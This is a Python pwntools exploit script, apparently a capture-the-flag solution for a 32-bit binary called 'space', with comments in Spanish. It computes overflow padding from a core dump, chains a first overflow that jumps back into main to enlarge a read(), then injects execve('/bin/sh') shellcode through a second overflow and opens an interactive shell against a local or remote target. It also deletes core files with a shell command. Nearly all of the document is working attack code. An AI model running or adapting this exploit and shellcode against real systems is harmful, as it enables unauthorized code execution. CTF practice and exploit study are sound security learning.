from pwn import *
import os

BINARY = './space'


if __name__ == "__main__":
	log.warn("IMPORTANT: Make sure your binary has been patched and is using the correct version of libc and ld loader!")

	log.info("For remote: %s HOST PORT" % sys.argv[0])
	log.info("For debug: %s -d\n" % sys.argv[0])

	if len(sys.argv) > 2:
		p = remote(sys.argv[1], int(sys.argv[2]))

	else:

		# Debug
		if len(sys.argv) > 1 and sys.argv[1] == '-d':
			p = gdb.debug(BINARY, '''
				b vuln
				b main
				continue
			''')

		else:
			p = process(BINARY)



	######################################
	## Getting padding
	######################################
	log.info("Getting padding for BOF...")

	p2 = process(BINARY)
	p2.sendline(cyclic(32))
	p2.wait()

	core = p2.corefile


	PADDING = int(str(cyclic_find(core.eip)))

	log.info("Padding: " + str(PADDING))

	PADDING = cyclic(PADDING)
	os.system("rm ./core*")


	######################################
	## Extract info from elf
	######################################
	elf = ELF(BINARY, checksec=False) # Extract data from binary

	MAIN_PLT = elf.symbols['main']


	# Con esto saltamos justo antes del read(), modificando el numero de bytes a leer, 
	# para tener un segundo BOF mas grande
	# Importante notar que al salir de vuln(), EAX contiene un valor en el stack. Concretamente,
	# EAX contiene el puntero resultante del strcpy(), que apunta al buff de destino (dest) del strcpy
	# De esta forma, llamaremos a read(0x0, *dest, 0x7c), por lo que podremo rellenar dest con 124 bytes 
	# y provocar un segundo BOF

	'''
	push	0x7c
	push	main+75
	ret
	'''
	shell2main = b'\x6a\x7c\x68' + p32(MAIN_PLT + 0x4B) + b'\xc3'

	# Esto salta al stack y ejecuta shell2main, volviendo justo antes del read
	# El gadget ejecuta lo siguiente
	'''
	push esp ; mov ebx, dword ptr [esp] ; ret
	'''
	p.sendline(b'A'*14 + p32(MAIN_PLT) + p32(0x080490b1) + shell2main)


	# Este segundo padding lo calculo a mano
	# La shell es un execve('/bin/sh') sencillito
	shell = b'\x6A\x0B\x58\x99\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\xCD\x80'

	PADDING2 = b'B'*6

	# Ahora tenemos un segundo BOF mas grande, donde podemos meter nuestro shellcode
	p.sendline(PADDING2 + p32(0x080490b1) + shell)

	log.success('PNWED!')

	p.interactive()